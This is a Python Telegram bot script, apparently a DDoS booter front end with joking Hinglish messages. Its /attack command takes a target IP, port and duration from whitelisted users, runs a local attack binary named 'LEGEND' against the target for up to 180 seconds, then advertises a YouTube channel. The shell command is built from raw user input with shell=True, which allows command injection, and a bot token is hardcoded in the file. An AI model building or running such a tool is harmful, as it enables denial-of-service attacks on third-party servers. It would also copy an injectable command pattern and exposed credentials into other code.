import telebot
import time
import subprocess
import random
from threading import Timer

# Bot token and admin information
BOT_TOKEN = '7228305815:AAGZvYtuYd6BC1J1qYeneQFPzDa4XDW5tYQ'
ADMIN_ID = 1232047106
OWNER_NAME = '@OWNERSRK'
CHANNEL_LINK = 'https://youtube.com/@zeroflexislive?si=zRItV1qSr1cGoEqX'

# Initialize the bot
bot = telebot.TeleBot(BOT_TOKEN)

# User management
authorized_users = set([ADMIN_ID])
cooldown_users = {}

# Fun messages
welcome_messages = [
    f"Yo! Main hoon {OWNER_NAME} ka secret agent. Kya haal hai?",
    f"Bhai! {OWNER_NAME} ka bot bol raha hoon. Ready ho sab kuch hilane ke liye?",
    f"Aaja bhai! {OWNER_NAME} ke bot ki duniya me, idhar sirf mazedari chalegi!"
]

attack_start_messages = [
    "Attack ka dhamaka hone wala hai! 💥",
    "Goli chali! Attack start! 🚀",
    "Yeh lo! Attack start! 🎯",
    "Hawa me barood ki boo hai... Attack shuru! 🧨"
]

cooldown_messages = [
    "Bhai! Pichli machine abhi bhi dhuaan chhod rahi hai! 🛠️",
    "Thoda intezaar kar bhai! Server ko saans lene de. 🧊",
    "Bhai chill! Attack cool down mode me hai. ☕",
    "Sabra ka phal meetha hota hai, bas kuch hi sec me ready! ⏳"
]

attack_complete_messages = [
    "Boss! Attack finish! Ab channel pe chalo: ",
    "Bhai! Mission complete! Ab apni community join karo: ",
    "Hogaya kaam! Ab YouTube pe milo: ",
    "Target done! Ab apna channel support karo: "
]

easter_eggs = [
    "Bhai! Secret baat bataun? Main sirf ek bot hoon... 😉",
    "Acha suna? Jo log /start karte hain, unke naseeb badal jate hain! 🌟",
    "Psst! Agar tum /attack use karte ho, toh tum bohot cool ho! 😎"
]

# Welcome message on /start
@bot.message_handler(commands=['start'])
def start(message):
    response = random.choice(welcome_messages)
    if random.randint(1, 10) > 8:  # 20% chance of Easter egg
        response += "\n" + random.choice(easter_eggs)
    bot.reply_to(message, response)

# Add user command (Admin only)
@bot.message_handler(commands=['add'])
def add_user(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            authorized_users.add(user_id)
            bot.reply_to(message, f"User {user_id} ko hamari gang me shamil kar liya! ✅")
        except (IndexError, ValueError):
            bot.reply_to(message, "Bhai sahi ID bhejo na! 🤨")
    else:
        bot.reply_to(message, "Sirf boss (admin) hi naye bande add kar sakte hain! 🚫")

# Remove user command (Admin only)
@bot.message_handler(commands=['remove'])
def remove_user(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            authorized_users.discard(user_id)
            bot.reply_to(message, f"User {user_id} ko gang se nikaal diya! ❌")
        except (IndexError, ValueError):
            bot.reply_to(message, "Sahi ID bhejo, aise kaise chalega! 🧐")
    else:
        bot.reply_to(message, "Bhai! Tumhe ye power nahi hai! 🔐")

# Attack command with binary execution and cooldown
@bot.message_handler(commands=['attack'])
def attack(message):
    user_id = message.from_user.id
    if user_id not in authorized_users:
        bot.reply_to(message, "Are bhai! Tumhe toh permission nahi hai! 🚫")
        return
    
    if user_id in cooldown_users and time.time() < cooldown_users[user_id]:
        cooldown_time = int(cooldown_users[user_id] - time.time())
        bot.reply_to(message, f"{random.choice(cooldown_messages)} ({cooldown_time} sec left)")
        return

    try:
        _, ip, port, duration = message.text.split()
        duration = min(int(duration), 180)

        # Command to run the attack binary with required parameters
        command = f"./LEGEND {ip} {port} {duration}"

        try:
            # Execute the binary with subprocess
            subprocess.Popen(command, shell=True)
            bot.reply_to(message, f"{random.choice(attack_start_messages)} Target: {ip}:{port} for {duration} sec.")

            # Set cooldown and timer for promotion message
            cooldown_users[user_id] = time.time() + 60

            def end_attack():
                bot.send_message(message.chat.id, f"{random.choice(attack_complete_messages)} {CHANNEL_LINK}")

            Timer(duration, end_attack).start()

        except Exception as e:
            bot.reply_to(message, f"Kuch gadbad ho gayi: {e} 😵")

    except (IndexError, ValueError):
        bot.reply_to(message, "Bhai! Format sahi bhejo: /attack <ip> <port> <time> (Max 180 sec) ⚠️")

# Start the bot
print("Bot is running... 🚀")
bot.infinity_polling()
